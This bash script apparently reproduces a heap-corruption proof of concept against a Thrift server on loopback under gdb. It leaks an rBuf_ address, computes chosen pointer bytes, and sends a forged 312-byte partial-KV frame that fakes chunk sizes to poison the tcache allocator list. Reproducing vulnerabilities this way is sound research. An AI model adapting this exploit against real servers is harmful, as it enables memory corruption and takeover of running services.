#!/bin/bash
# W148 deterministic two-step replay of the forged-chunk allocator-list lane.
# Step 1 reads the fixed-address rBuf_ anchor from a benign no-flush connection.
# Step 2 sends the matching 312-byte partial-KV frame, then several safe frames
# to provoke later small allocations. Gdb evidence is raw; the normalizer
# produces address-free output. Loopback only.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p results
tmp=$(mktemp -d /tmp/thrift-tcache.XXXXXX)
trap 'rm -rf "$tmp"' EXIT
port=29980

# Step 1: anchor.
timeout 6 gdb -q -batch -x gdb-tcache-off.gdb \
  --args ./live-noflush server-noflush "$port" >"$tmp/anchor.log" 2>&1 &
gpid=$!
sleep 1
python3 raw-client.py "$port" kv-partial-safe.bin 1 >/dev/null 2>&1
sleep 1
kill "$gpid" 2>/dev/null || true
wait "$gpid" 2>/dev/null || true
anchor=$(grep -m1 '^ANCHOR ' "$tmp/anchor.log") || exit 1
rbuf=${anchor#*rbuf=}
rbuf=${rbuf%% *}
case "$rbuf" in 0x*) ;; *) echo "BAD_ANCHOR $anchor" >&2; exit 1;; esac
low=$(python3 -c "print('%04x' % (($rbuf + 512) & 0xffff))")
bytes="${low:2:2}${low:0:2}"
echo "ANCHOR_RBUF=$rbuf CHOSEN_LOW=$low"

# Step 2: chosen free plus later allocations.
port=$((port+1))
python3 make-kv-frame.py "$tmp/attack.bin" --base kv-ptr14.bin --plain-len 312 \
  --patch 21=0000011c --patch 310="$bytes" \
  --patch 214=3100000000000000 --patch 278=2100000000000000 \
  --patch 230=a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5 --pad-compressed 160 >/dev/null
timeout 20 gdb -q -batch -x gdb-tcache-off.gdb \
  --args ./live-noflush server-noflush "$port" >"$tmp/probe.log" 2>&1 &
gpid=$!
sleep 1
python3 raw-client.py "$port" "$tmp/attack.bin" 1 >/dev/null 2>&1
for _ in 1 2 3 4 5 6 7 8 9 10; do
  sleep 0.4
  python3 raw-client.py "$port" kv-partial-safe.bin 1 >/dev/null 2>&1
done
wait "$gpid" 2>/dev/null || true
cp "$tmp/probe.log" results/tcache-vuln.log
python3 normalize-tcache.py >results/tcache-normalized.txt || exit 1
cat results/tcache-normalized.txt
sha256sum results/tcache-normalized.txt
